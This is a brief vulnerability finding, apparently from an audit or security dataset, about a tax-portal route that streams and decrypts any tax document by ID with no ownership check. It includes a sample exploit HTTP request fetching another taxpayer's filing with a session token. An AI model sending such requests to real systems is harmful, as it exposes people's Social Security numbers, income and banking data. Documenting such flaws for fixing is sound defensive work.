diagnosis: The route handler streams and decrypts arbitrary tax documents via a Node.js Transform pipeline based solely on the req.params.documentId route parameter. It performs no authorization check against the user's session or account identity. Any authenticated user can stream and view tax filings containing Social Security Numbers, income figures, and banking data belonging to other taxpayers.
exploit_request:
GET /api/v1/tax-documents/doc_tax_2025_99824/stream HTTP/1.1
Host: taxportal.finance.gov:8080
Authorization: Bearer <taxpayer_session_token>
Accept: application/pdf
